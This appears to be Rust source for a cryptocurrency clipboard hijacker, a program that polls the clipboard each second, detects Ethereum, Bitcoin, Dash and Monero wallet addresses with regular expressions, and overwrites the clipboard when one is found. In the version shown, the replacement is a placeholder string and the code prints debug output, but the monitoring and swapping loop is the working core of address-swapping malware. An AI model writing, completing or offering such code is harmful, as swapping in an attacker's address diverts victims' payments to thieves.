/// src/bin/main.rs

/// src/bin/lib.rs
extern crate clipper;

use clipper::clipboard::set_clipboard_text;
use regex::Regex;
use std::collections::HashMap;
use std::{thread, time};

///
fn open_clipboard() -> Result<(), &'static str> {
    clipper::clipboard::open_clipboard()
}

///
fn close_clipboard() -> () {
    clipper::clipboard::close_clipboard().unwrap_or_else(|_| {});
}

///
fn check_clipboard() -> Result<String, i8> {
    // Opening the clipboard
    if let Err(e) = clipper::clipboard::open_clipboard() {
        println!("Error opening clipboard: {}", e);
        return Err(0);
    }
    // Reading clipboard text
    let clipboard_text: String = match clipper::clipboard::get_clipboard_text() {
        Ok(clipboard_text) => {
            println!("Clipboard content: {}", clipboard_text);
            clipboard_text }
        Err(e) => {
            println!("Error reading from clipboard: {}", e);
            close_clipboard();
            return Err(0);
        }
    };
    close_clipboard();
    Ok(clipboard_text)
}

///
fn find_patterns(text: &str, re_eth: Regex, re_btc: Regex, re_dash: Regex, re_xmr: Regex) -> Result<&str, i8> {
    let patterns: HashMap<&str, Regex> = HashMap::from([
        ("eth", re_eth),
        ("btc", re_btc),
        ("dash", re_dash),
        ("xmr", re_xmr)
    ]);
    for (currency, re) in patterns.iter() {
        if re.is_match(text) {
            return Ok(currency);
        }
    }
    Err(0)
}

///
fn change_clipboard_text() -> () {
    let new_text: String = "hehe :3".to_owned();
    if let Ok(_) = open_clipboard() {
        set_clipboard_text(&new_text).unwrap_or_else(|_| {});
    }

}

fn main() {
    // Compile patterns
    let re_eth: Regex = Regex::new(r"^0x[a-fA-F0-9]{40}$").unwrap();
    /*
     * BTC pattern recognizes:
     * P2PKH, P2SH, Bech32
     */
    let re_btc: Regex = Regex::new(r"^(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[a-z0-9]{39,59})$").unwrap();
    let re_dash: Regex = Regex::new(r"^X[1-9A-HJ-NP-Za-km-z]{33}$").unwrap();
    let re_xmr: Regex = Regex::new(r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$").unwrap();
    let mut last_clipboard_text = String::new();
    loop {
        thread::sleep(time::Duration::from_millis(1000));
        let mut clipboard_text: String = String::new();
        if let Ok(result) = check_clipboard() {
            clipboard_text = result;
        }
        if clipboard_text == last_clipboard_text {
            continue;
        }
        last_clipboard_text = clipboard_text.clone();
        if let Ok(result) = find_patterns(&clipboard_text, re_eth.clone(), re_btc.clone(), re_dash.clone(), re_xmr.clone()) {
            println!("address {}", result);
            change_clipboard_text();
        } else {
            println!("No patterns recognized");
        }
    }
}
